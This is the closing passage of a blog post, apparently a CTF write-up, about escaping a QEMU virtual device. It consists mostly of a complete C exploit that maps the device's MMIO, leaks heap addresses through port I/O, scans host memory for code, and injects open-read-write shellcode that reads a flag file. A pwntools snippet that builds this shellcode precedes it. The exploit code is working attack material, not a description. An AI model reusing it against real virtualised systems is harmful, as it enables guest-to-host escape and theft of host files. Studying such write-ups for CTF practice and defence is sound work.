= shellcraft.read(<span class="string">&quot;rax&quot;</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode_write = shellcraft.write(<span class="number">1</span>,<span class="string">&quot;rsp&quot;</span>,<span class="number">60</span>)</span><br><span class="line">shellcode= asm(shellcode_open+shellcode_read+shellcode_write)</span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> shellcode:</span><br><span class="line">    data += <span class="string">&quot;,&quot;</span>+<span class="built_in">hex</span>(i) </span><br><span class="line"></span><br><span class="line">data = <span class="string">&quot;&#123;&quot;</span> + data[<span class="number">1</span>:] + <span class="string">&quot;&#125;;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;shellcode.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 <code>execve(&quot;/bin/sh&quot;)</code> 没有交互，我这里只能写 ORW</li>
</ul>
<p>完整 exp 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span> * mmio;</span><br><span class="line"><span class="keyword">int</span> port_base = <span class="number">0xc040</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pmio_write</span><span class="params">(<span class="keyword">int</span> addr, <span class="keyword">char</span> val)</span></span>&#123; outb(val, port_base + addr); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">int64_t</span> addr, <span class="keyword">uint32_t</span> value)</span></span>&#123; *(<span class="keyword">uint32_t</span> *)(mmio + addr) = value;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">pmio_read</span><span class="params">(<span class="keyword">int</span> addr)</span> </span>&#123; <span class="keyword">return</span> inl(port_base + addr); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span>&#123; <span class="keyword">return</span> *(<span class="keyword">int</span> *)(mmio + addr); &#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    iopl(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span>  mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    mmio         = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;yehllow&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> data[<span class="number">0x10</span>] = &#123;<span class="number">1179927361</span>, <span class="number">860382075</span>, <span class="number">828328803</span>, <span class="number">1232559982</span>, <span class="number">1113548855</span>, <span class="number">1601790528</span>, <span class="number">1752183107</span>, <span class="number">1415541299</span>, <span class="number">1601447013</span>, <span class="number">1365208625</span>, <span class="number">1599425843</span>, <span class="number">2033478768</span>, <span class="number">1968124775</span>, <span class="number">828335182</span>, <span class="number">1095065380</span>, <span class="number">2099345747</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x10</span>;i++)&#123;</span><br><span class="line">        mmio_write(i*<span class="number">4</span>,data[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">1</span>,<span class="number">4</span>); </span><br><span class="line">    <span class="keyword">uint32_t</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> heap_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> libc_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> libc_base = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> target_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint32_t</span> shellcode_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        addr = inb(port_base + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(addr == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pmio_write(<span class="number">0x18</span>,<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc ok&quot;</span>);</span><br><span class="line">    addr = mmio_read(<span class="number">0x40</span>);</span><br><span class="line">    heap_addr = addr;</span><br><span class="line">    heap_base = heap_addr &amp; <span class="number">0xffffffffff000000</span>;</span><br><span class="line">    target_addr = heap_base + <span class="number">0xFF1D000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;heap_base &gt;&gt; 0x%x\n&quot;</span>,heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target_addr &gt;&gt; 0x%x\n&quot;</span>,target_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x200000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">uint64_t</span> dump = <span class="number">0</span>;</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, target_addr);</span><br><span class="line">        dump += pmio_read(<span class="number">0x10</span>);</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, target_addr + <span class="number">4</span>);</span><br><span class="line">        dump += pmio_read(<span class="number">0x10</span>) * <span class="number">0x100000000</span>;</span><br><span class="line"></span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%d: *(0x%x)=0x%lx \n&quot;</span>, i,target_addr,dump);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dump == <span class="number">0x5641554154415355</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            shellcode_addr = target_addr;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;shellcode_addr &gt;&gt; 0x%x\n&quot;</span>, shellcode_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        target_addr -= <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> shellcode[] = &#123;<span class="number">0x68</span>,<span class="number">0x66</span>,<span class="number">0x6c</span>,<span class="number">0x61</span>,<span class="number">0x67</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe7</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x31</span>,<span class="number">0xf6</span>,<span class="number">0x6a</span>,<span class="number">0x2</span>,<span class="number">0x58</span>,<span class="number">0xf</span>,<span class="number">0x5</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x6a</span>,<span class="number">0x3c</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0xf</span>,<span class="number">0x5</span>,<span class="number">0x6a</span>,<span class="number">0x1</span>,<span class="number">0x5f</span>,<span class="number">0x6a</span>,<span class="number">0x3c</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x6a</span>,<span class="number">0x1</span>,<span class="number">0x58</span>,<span class="number">0xf</span>,<span class="number">0x5</span>&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;shellcode len &gt;&gt; 0x%lx\n&quot;</span>, <span class="built_in">strlen</span>(shellcode));</span><br><span class="line"></span><br><span class="line">    shellcode_addr = shellcode_addr + <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(shellcode);i++)&#123;</span><br><span class="line">        mmio_write(<span class="number">0x40</span>, shellcode_addr+i);</span><br><span class="line">        pmio_write(<span class="number">0x10</span>,shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    mmio_write(<span class="number">0x40</span>, shellcode_addr - <span class="number">4</span>);</span><br><span class="line">    outl(<span class="number">0x90909090</span>, port_base + <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/32/">32</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">314</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">162</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.7m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">70:57</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
